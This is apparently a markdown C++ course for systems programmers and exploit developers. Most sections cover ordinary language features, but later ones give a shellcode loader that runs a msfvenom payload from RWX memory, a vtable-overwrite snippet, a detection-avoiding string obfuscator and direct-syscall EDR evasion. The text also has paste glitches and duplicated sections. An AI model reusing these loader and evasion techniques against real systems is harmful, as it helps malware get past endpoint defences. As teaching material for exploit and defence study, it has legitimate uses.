# 💣 Advanced C++ Mastery Course (No-Fluff, Code-Rich Edition)

> Master real-world, practical, modern and low-level C++ — for serious systems programmers, exploit devs, and performance-focused hackers. Includes deep explanations, code examples, and caveats.

---

## ⚙️ 1. Compilation Model & Linking

C++ is compiled in **multiple passes** — you must understand this to control symbol visibility, linkage, and object code generation.

### 🔹 Example: static vs extern

```cpp
// file1.cpp
int x = 42;         // global variable
static int hidden = 99;

// file2.cpp
extern int x;       // access from another file
```

### 🔹 Preprocessor, Translation Units

Each `.cpp` is a **translation unit**. Headers are just copy-pasted text before compilation.

```cpp
#define MAX 1024
#include <iostream>
```

---

## 🔥 2. Memory Management

You control all memory: allocation, layout, alignment, and lifetime.

```cpp
char* buf = (char*)malloc(64);
strcpy(buf, "data");
free(buf);  // manual
```

### 🔹 Placement New

```cpp
char raw[sizeof(int)];
int* p = new (raw) int(10);  // constructs int in pre-allocated memory
```

### 🔹 Dangerous Stuff

```cpp
delete p;       // only if allocated with new
free(p);        // only if allocated with malloc
```

---

## 🧠 3. Smart Pointers

Modern C++ uses **RAII (Resource Acquisition Is Initialization)** for automatic memory handling.

```cpp
#include <memory>

std::unique_ptr<int> ptr(new int(42));
// auto cleanup on scope exit

std::shared_ptr<int> sp1 = std::make_shared<int>(10);
std::shared_ptr<int> sp2 = sp1; // ref count = 2
```

---
## ⚔️ 4. RAII — Resource Acquisition Is Initialization
Tie resource lifetime to object scope.

```cpp
Copy code
class File {
  FILE* f;
public:
  File(const char* path) { f = fopen(path, "r"); }
  ~File() { if (f) fclose(f); }
};
```

---
## 🔩 5. STL & Containers

### 🔹 Useful Containers:
```md
std::vector<T> — dynamic array

std::map<Key, Value> — ordered key-value

std::unordered_map — hash map

std::set, std::list, std::deque
```

```cpp
Copy code
std::vector<int> v = {1, 2, 3};
v.push_back(4);
```
---
## 🧠 6. Pointers, References & Aliasing

### 🔹 Raw Pointers
```cpp
Copy code
int a = 10;
int* p = &a;
```
### 🔹 References
```cpp
Copy code
int& ref = a;
ref = 20; // modifies `a`
```

---
## 🧵 7. Const Correctness

```cpp
Copy code
void print(const std::string& msg); // cannot modify msg
const int* p;   // pointer to const int
int* const p2;  // const pointer to int
```

---
## 8. Object Lifetime, Constructors, & Destructors
 
### 🔹 Rule of 3 / 5 / 0
```cpp
Copy code
class Obj {
  char* data;
public:
  Obj(const Obj&);            // copy ctor
  Obj& operator=(const Obj&); // copy assign
  ~Obj();                     // destructor

  Obj(Obj&&);                 // move ctor (C++11)
  Obj& operator=(Obj&&);      // move assign (C++11)
};
```

---

## 🧬 9. Templates & Metaprogramming

Used for type-safe generic programming and even compile-time logic.

```cpp
template <typename T>
T add(T a, T b) { return a + b; }

add(5, 10); // int
add(2.5, 1.1); // double


//Template specialisation the 
template<>
const char* max<const char*>(const char* a, const char* b);

```

### 🔹 Compile-time logic (SFINAE)

```cpp
template<typename T>
auto isPointer(T t) -> decltype(*t, bool()) {
    return true;
}
```

---

## 🧪 10. Polymorphism Internals (VTables)

```cpp
class Base {
public:
    virtual void speak() { std::cout << "Base
"; }
    virtual ~Base() = default;
};

class Derived : public Base {
public:
    void speak() override { std::cout << "Derived
"; }
};

Base* b = new Derived();
b->speak(); // uses vtable to call Derived::speak
```

### 🔹 Manual vtable overwrite (in exploit)

```cpp
typedef void(*Func)();
Func fake_vtable[] = { (Func)&malicious };

*(void**)object = fake_vtable;
object->virtualMethod(); // jumps to malicious
```

---

## 🏗️ 11. RAII & Lifetime

```cpp
class File {
    FILE* f;
public:
    File(const char* path) { f = fopen(path, "r"); }
    ~File() { if(f) fclose(f); }
};
```

> Ensures `fclose()` happens even if exceptions occur.

---

## 🧰 12. STL Power

```cpp
#include <vector>
#include <algorithm>

std::vector<int> v = {4, 1, 5, 2};
std::sort(v.begin(), v.end()); // in-place sort

for (int x : v) std::cout << x << " ";
```

---

## 📦 13. Move Semantics

```cpp
class Buffer {
    int* data;
public:
    Buffer(size_t size) { data = new int[size]; }
    ~Buffer() { delete[] data; }

    // Move constructor
    Buffer(Buffer&& other) noexcept {
        data = other.data;
        other.data = nullptr;
    }
};
```

> Avoids deep copies, used by STL containers and smart pointers.

---
## 🔁 14. Iterators & Ranges
```cpp
Copy code
for (auto it = v.begin(); it != v.end(); ++it)
    std::cout << *it;

for (int x : v) std::cout << x; // range-based
```

---
## 🧩 15. Lambdas (C++11+)
```cpp
Copy code
auto square = [](int x) { return x * x; };
```
```cpp
int x = 5;
auto f = [x]() { return x + 1; };
```

---

## 🎭 16. Polymorphism, Virtual Functions
```cpp
Copy code
class Base {
public:
  virtual void speak() { std::cout << "Base"; }
  virtual ~Base() {}
};

class Derived : public Base {
  void speak() override { std::cout << "Derived"; }
};
```

---
## 🕳 17. Undefined Behavior & Pitfalls

- Accessing uninitialized memory

- Signed integer overflow

- Dangling references

- Use-after-free

---

## ⚗️ 18. Bit Manipulation
```cpp
Copy code
x |= (1 << n);   // set bit n
x &= ~(1 << n);  // clear bit n
x ^= (1 << n);   // toggle bit n
bool b = (x >> n) & 1; // read bit
```

---
## ⚠️ 19. Exceptions & `noexcept`

```cpp
void foo() noexcept {
    // guarantees no exceptions
}
```

Use `try/catch` for stack-unwinding safety.

```cpp
try {
    risky();
} catch (const std::exception& e) {
    std::cerr << e.what();
}
```

---

## 🧱 20. Low-Level / Exploit-Relevant Types
```cpp
Copy code
#include <cstdint>
uint8_t  a = 0xFF;
uintptr_t addr = (uintptr_t)ptr;
```

---

## 🧾 21. Volatile, Inline, Alignas
```cpp
Copy code
volatile int* reg = (int*)0xBEEF;
inline int square(int x) { return x * x; }
alignas(16) int buf[4];
```

---
## 🪓 22. Custom Allocators
```cpp
template<typename T>
struct MyAlloc {
  T* allocate(size_t n) { return (T*)malloc(n * sizeof(T)); }
  void deallocate(T* p, size_t) { free(p); }
};
Used in STL customization or exploit-safe containers.
```

---


## 🪤 23. Function Pointers & Callbacks

``` cpp
Copy code
int add(int a, int b) { return a + b; }
int (*fptr)(int, int) = add;
```
--- 

## 🧬 24. Type Traits & Metaprogramming (C++11+)
```cpp
Copy code
#include <type_traits>

std::is_integral<int>::value; // true
```

---

## 🔄 25. Move Semantics
```cpp
Copy code
std::vector<int> a = {1, 2, 3};
std::vector<int> b = std::move(a); // no copy
```

---

## 🧵 26. Multithreading (C++11+)

```cpp
#include <thread>

void task() { std::cout << "Running...
"; }
std::thread t(task);
t.join();
```

### 🔹 Data safety

```cpp
std::mutex m;
m.lock();
// shared data
m.unlock();
```

### Example 
```cpp
#include <thread>
void task() {}
std::thread t(task);
t.join();
Also look into mutex, lock_guard, condition_variable.
```

---

## 🔩 27. Exploit-Oriented Behavior

### 🔹 Use-after-free

```cpp
int* x = new int(5);
delete x;
*x = 10; // UAF (undefined behavior)
```

### 🔹 Buffer overflow

```cpp
char buf[8];
strcpy(buf, "OVERFLOW!!"); // unsafe
```

---

## 🧠 28. Modern Features Summary

- `auto`, `decltype`
- `constexpr`, `consteval`
- `std::optional`, `std::variant`
- Structured bindings
- Lambdas with capture
- Concepts (C++20)

```cpp
auto square = [](int x) { return x * x; };
```

---

## 🌀 29. Lambdas, std::function, and Closures

```cpp
auto adder = [](int a, int b) -> int { return a + b; };
std::cout << adder(2, 3);  // 5

int base = 10;
auto capture = [base](int x) { return base + x; };
```

- Lambdas are **anonymous functions**.
- `[&]` captures variables by reference, `[=]` by value.

```cpp
std::function<void()> f = [] { std::cout << "Func!
"; };
f();  // calls lambda
```

---

## 🔣 30. `if constexpr` & Type Traits (Metaprogramming)

```cpp
template<typename T>
void printType(const T& x) {
    if constexpr (std::is_integral<T>::value)
        std::cout << "Integral
";
    else
        std::cout << "Non-integral
";
}
```

- `if constexpr` enables **compile-time branching**.
- Works with `<type_traits>`.

---

## 📚 31. Exceptions (Robust Error Handling)
```cpp
Copy code
try {
  throw std::runtime_error("Err");
} catch (std::exception& e) {
  std::cout << e.what();
}
```

---

## 📏 32. sizeof, alignof, typeid
```cpp
Copy code
sizeof(int);         // 4 (typical)
alignof(double);     // platform-dependent
typeid(x).name();    // RTTI
```

---

## 🧰 33. Concepts (C++20)

```cpp
template<typename T>
concept Addable = requires(T a, T b) { a + b; };

template<Addable T>
T add(T a, T b) { return a + b; }
```

- Replaces SFINAE.
- Cleaner constraints for templates.

---

## ⚡ 34. Custom Allocators in STL

```cpp
template<typename T>
struct MyAllocator {
    using value_type = T;
    T* allocate(std::size_t n) {
        return static_cast<T*>(::operator new(n * sizeof(T)));
    }
    void deallocate(T* p, std::size_t) noexcept {
        ::operator delete(p);
    }
};

std::vector<int, MyAllocator<int>> v;
```

- Control over memory layout.
- Crucial for writing hardened or embedded C++.

---

## 🧵 35. Coroutines (C++20)

```cpp
#include <coroutine>

struct Task {
    struct promise_type {
        Task get_return_object() { return {}; }
        std::suspend_never initial_suspend() { return {}; }
        std::suspend_never final_suspend() noexcept { return {}; }
        void return_void() {}
        void unhandled_exception() {}
    };
};
```

- Coroutines let you write async code in sync style.
- Used for I/O, networking, fiber systems.

---

## ⚙️ 36. Custom Iterators

```cpp
class Range {
    struct Iterator {
        int value;
        int operator*() const { return value; }
        Iterator& operator++() { ++value; return *this; }
        bool operator!=(const Iterator& other) const { return value != other.value; }
    };
public:
    Iterator begin() const { return {0}; }
    Iterator end() const { return {10}; }
};

for (int x : Range()) std::cout << x << " ";
```

- Required to make custom containers STL-compatible.

---

## 🧩 37. Memory Alignment

```cpp
struct alignas(16) Aligned {
    char data[16];
};

std::cout << alignof(Aligned); // 16
```

- Use `alignas`, `alignof`.
- Avoids unaligned access crashes on SIMD systems.

---

## 🧱 38. Manual ABI Control

- Needed for **binary interfacing**, e.g., DLL hooking or fuzzing.
- Avoid exceptions, RTTI, STL in ABI-stable boundaries.

```cpp
extern "C" void export_func(); // disables name mangling
```

---

## 🎭 39. `std::variant` & `std::visit`

```cpp
std::variant<int, std::string> v = "hi";

std::visit([](auto&& val) {
    std::cout << val;
}, v);
```

- Type-safe union replacement.
- Works with lambdas.

---

## 🧊 40. Function Hiding & Overload Resolution

```cpp
class A {
public:
    void foo(int) {}
};

class B : public A {
public:
    void foo(double) {} // hides A::foo
};

B b;
b.foo(1); // calls B::foo(double), NOT A::foo(int)
```

- Use `using A::foo;` in B to fix it.

---

## 🔍 41. RTTI Internals & `typeid`

```cpp
Base* b = new Derived();
std::cout << typeid(*b).name(); // prints actual type
```

- RTTI uses `type_info` + vtables internally.
- Often stripped in hardened builds.

---

## 💎 42. Virtual Inheritance & Diamond Problem

```cpp
struct A { int x; };
struct B : virtual A {};
struct C : virtual A {};
struct D : B, C {};
```

- `virtual` solves duplicate `A` in `D`.
- Increases complexity and indirection.

---

## ⏱️ 43. `std::chrono`

```cpp
#include <chrono>

auto start = std::chrono::high_resolution_clock::now();
// work
auto end = std::chrono::high_resolution_clock::now();
std::cout << std::chrono::duration<double>(end - start).count();
```

- High-res timers for profiling, fuzzing, race detection.

---

## 🛠️ 44. Debugging Tools (Valgrind, GDB, Sanitizers)

### 🔹 GDB

```bash
g++ -g prog.cpp
gdb ./a.out
(gdb) break main
```

### 🔹 Valgrind

```bash
valgrind ./a.out
```

### 🔹 AddressSanitizer

```bash
g++ -fsanitize=address -g test.cpp
```

- Catch UAFs, OOBs, leaks.

---

## 🧳 45. Type Erasure

```cpp
#include <any>
#include <iostream>

std::any val = 10;
std::cout << std::any_cast<int>(val);
```

- Use `std::any`, `std::function` for dynamic polymorphism without inheritance.
- Useful for plugin systems and APIs.

---


## 46. 🧬 C++ Templates + Metaprogramming (For Malware Obfuscation & Speed)

Templates in C++ allow compile-time logic, which means:
- You can write **code that runs at compile time** instead of runtime.
- Use it to avoid detection, auto-generate classes, or optimize payload behavior.

### ⚙️ Example: XOR Obfuscator at Compile-Time

```cpp
template<int Key>
class XORString {
    const char* obfuscated;
public:
    XORString(const char* input) {
        for (int i = 0; input[i]; i++) {
            const_cast<char*>(input)[i] ^= Key;
        }
        obfuscated = input;
    }

    void printDeobfuscated() {
        for (int i = 0; obfuscated[i]; i++) {
            std::cout << (char)(obfuscated[i] ^ Key);
        }
    }
};

int main() {
    XORString<0x55> s("MaliciousString");
    s.printDeobfuscated(); // Prints: MaliciousString
}
```



## 🔥 47. ROP & Shellcode Integration in C++

Return-Oriented Programming (ROP) and raw shellcode usage is essential when:
- You want **manual exploitation control**
- You want to **execute payloads** in C++ directly
- You need **bypass execution control flow (DEP/ASLR)**

---

### 🧠 What is ROP?

ROP is a method of chaining small instructions (gadgets) already present in memory to perform operations without injecting code.

In C++: we typically **don't construct full ROP chains manually**, but instead:
- Use C++ to **build ROP chains dynamically**
- Load **pre-built shellcode**
- Trigger it **safely via memory protections**

---

### ⚙️ Example: Injecting & Executing Shellcode in C++

```cpp
#include <windows.h>
#include <iostream>

// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f c
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00..."; // (truncated)

int main() {
    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    
    std::cout << "[*] Shellcode copied to executable memory.\n";

    ((void(*)())exec_mem)();  // Function pointer call to shellcode

    return 0;
}
```

### Keypoints

VirtualAlloc gives RWX permissions (dangerous in real environments, but educational).

This is equivalent to a payload loader.

Often combined with:

    XOR/encrypted shellcode

    Memory unhooking before execution

🧠 Bonus: ROP Chain Automation (Via C++)

// You can auto-generate ROP payloads (e.g., VirtualProtect+shellcode) with offset patching
```cpp
struct ROPChain {
    uintptr_t gadget1;
    uintptr_t gadget2;
    uintptr_t virtualProtect;
    uintptr_t shellcodeAddr;
    // ...
};
```

## 🔧 48. Direct Syscalls / Syscall Stubbing in C++

Direct syscalls = calling Windows kernel functions **without** passing through hooked user-mode APIs like `NtOpenProcess`, `NtReadVirtualMemory`, etc.

> ⚠️ Powerful EDRs hook ntdll.dll — so your usual calls like `VirtualAlloc`, `CreateRemoteThread`, or even `Nt*()` functions are watched.

---

### 🧠 What Are Syscalls?

- Windows syscalls are kernel functions triggered via the `syscall` instruction.
- Usually called from user-mode through `ntdll.dll`.
- You can **find and trigger them manually** if `ntdll` is hooked.

---

### 🛡️ Why Do It?


| Goal                      | Benefit                           |
|---------------------------|-----------------------------------|
| EDR evasion               | Bypass userland API hooks         |
| Code injection, read/write| Done silently                     |
| Lower-level access        | More stable in restricted setups  |

---

### ⚙️ Basic Structure: Find & Call Syscall Manually

```cpp
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

int main() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _NtAllocateVirtualMemory NtAllocVM = (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");

    PVOID addr = NULL;
    SIZE_T size = 0x1000;
    NTSTATUS status = NtAllocVM(GetCurrentProcess(), &addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status == 0) {
        std::cout << "[+] Syscall succeeded. Addr: " << addr << "\n";
    }
}
```

| 🧬 Note: If NtAllocateVirtualMemory is hooked, extract syscall number from unhooked ntdll copy (from disk), then manually syscall.

🚀 Example: Syscall Stub Generator

Use SysWhispers2 or SysWhispers3 to generate C/C++ syscall stubs for:
```cpp
    NtReadVirtualMemory

    NtWriteVirtualMemory

    NtOpenProcess

    etc.

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG BufferSize,
    PULONG NumberOfBytesWritten
);
```

    Requires system call number (changes per build — use ntdll.dll from same version).

    Direct syscall from WOW64 (32-bit on 64-bit) is tricky — use Heaven's Gate.


